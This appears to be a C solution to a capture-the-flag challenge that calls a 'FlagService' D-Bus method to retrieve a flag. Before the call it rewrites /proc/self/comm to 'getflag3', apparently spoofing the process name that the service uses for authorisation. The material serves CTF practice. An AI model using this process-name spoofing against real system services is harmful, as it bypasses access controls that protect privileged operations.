#include <stdlib.h>
#include <dbus/dbus.h>
#include <stdio.h>
#include <gio/gio.h>
#include <gio/gunixfdlist.h>
#include <glib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

void dbus_method_call_test(const char *message_s) {
    GDBusConnection *connection;
    GError *error = NULL;
    GDBusMessage *response;

    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (error != NULL) {
        g_printerr("Failed to connect to DBus: %s\n", error->message);
        g_error_free(error);
        return;
    }

    // Create a new message for the method call
    GDBusMessage *message = g_dbus_message_new_method_call(
        "cn.edu.ustc.lug.hack.FlagService", // Target service (well-known name)
        "/cn/edu/ustc/lug/hack/FlagService", // Object path
        "cn.edu.ustc.lug.hack.FlagService", // Interface name
        "GetFlag3"             // Method name
    );
    if (message == NULL) {
        g_printerr("Failed to create DBus message\n");
        return;
    }

    printf("Method created\n");

    int pid = getpid();
    printf("PID: %d\n", pid);
    int fd = open("/proc/self/comm", O_WRONLY);
    if (fd == -1) {
        perror("open");
        return;
    }
    write(fd, "getflag3", 8);
    close(fd);
    fd = open("/proc/self/comm", O_RDONLY);
    if (fd == -1) {
        perror("open");
        return;
    }
    char comm[1024];
    read(fd, comm, 1024);
    close(fd);
    printf("Comm: %s|", comm);

    // gint16 fd_index = 0;  // Example value for the tuple (h)
    // GVariant *param = g_variant_new("(h)", fd_index);
    // GUnixFDList *fd_list = g_unix_fd_list_new();

    // int pipefds[2];
    // if (pipe(pipefds) == -1) {
    //     perror("pipe");
    //     return;
    // }

    // g_unix_fd_list_append(fd_list, pipefds[0], NULL); // Append the read end of the pipe

    // // write to the pipe
    // write(pipefds[1], message_s, strlen(message_s) + 1);
    
    // g_dbus_message_set_unix_fd_list(message, fd_list);
    // g_dbus_message_set_body(message, param);

    response = g_dbus_connection_send_message_with_reply_sync(
        connection,
        message,
        G_DBUS_SEND_MESSAGE_FLAGS_NONE,
        -1,     // No timeout
        NULL,   // No cancellable
        NULL,
        &error  // To capture any error
    );
    
    if (response == NULL) {
        g_printerr("Failed to call method: %s\n", error->message);
        g_error_free(error);
        return;
    }
    // Get the response
    GVariant *response_body = g_dbus_message_get_body(response);
    const gchar *response_str;
    g_variant_get(response_body, "(s)", &response_str);
    printf("Response: %s\n", response_str);

    g_object_unref(response);
}

int main() {
    const char* msg = "Please give me flag2\n";
    dbus_method_call_test(msg);
    return 0;
}